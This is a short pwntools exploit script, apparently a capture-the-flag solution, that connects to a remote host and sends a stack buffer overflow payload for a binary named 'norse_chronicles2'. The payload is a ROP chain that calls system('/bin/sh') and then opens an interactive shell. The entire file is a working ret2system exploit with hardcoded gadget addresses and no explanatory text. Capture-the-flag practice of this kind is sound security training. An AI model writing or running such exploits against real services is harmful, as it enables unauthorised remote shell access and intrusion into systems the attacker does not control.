from pwn import *

#r = process('norse_chronicles2')
r = remote('167.99.118.184', 31338)

POP_RDI_POP_RBP = p64(0x495b30)

BIN_SH = p64(0x49afe5)

SYSTEM = p64(0x40b8e0)

#pid = gdb.attach(r, gdbscript= '''
#                 break *vulnerable_function+46
#                 ''')

payload = b'A'* cyclic_find(b'jaab')

payload += POP_RDI_POP_RBP
payload += BIN_SH
payload += b'C'*8

payload += SYSTEM

r.sendline(payload)
r.interactive()
